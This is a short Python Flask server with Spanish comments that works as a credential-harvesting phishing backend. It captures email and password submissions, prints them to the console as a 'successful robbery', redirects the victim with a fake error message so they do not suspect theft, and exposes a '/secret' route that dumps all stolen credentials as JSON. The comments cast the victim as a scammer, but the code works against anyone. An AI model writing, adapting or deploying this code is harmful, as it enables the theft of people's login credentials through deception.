from flask import Flask, request, redirect, render_template
import json
import time

# Creamos la aplicación
app = Flask(__name__)

# Lista vacía para guardar las contraseñas
lista_contraseñas = []

# Ruta principal: Cuando alguien entra a la página, muestra el HTML
@app.route('/')
def inicio():
    return render_template('index.html')

# Ruta de login: Cuando el estafador da clic en "Iniciar Sesión"
@app.route('/login', methods=['POST'])
def recibir_datos():
    # Capturamos lo que escribió
    email = request.form['email']
    password = request.form['password']

    # Guardamos los datos en la lista
    nuevo_robos = {
        'correo': email,
        'contraseña': password,
        'hora': time.strftime("%H:%M:%S")
    }
    lista_contraseñas.append(nuevo_robos)

    # IMPRIMIR EN PANTALLA (Para que tú lo veas en la terminal)
    print("-----------------------------------")
    print(f"¡ROBO EXITOSO!")
    print(f"Correo: {email}")
    print(f"Contraseña: {password}")
    print("-----------------------------------")

    # Redirigimos al estafador a la misma página con un mensaje de error
    # Esto hace que él crea que se equivocó de contraseña y no desconfía
    return redirect('/?error=1')

# Ruta secreta para ti: Para ver las contraseñas desde un navegador
@app.route('/secret')
def ver_secretas():
    return json.dumps(lista_contraseñas, indent=4)

# Iniciar el servidor
if __name__ == '__main__':
    # Esto hace que la página se vea en el puerto 5000
    app.run(host='0.0.0.0', port=5000)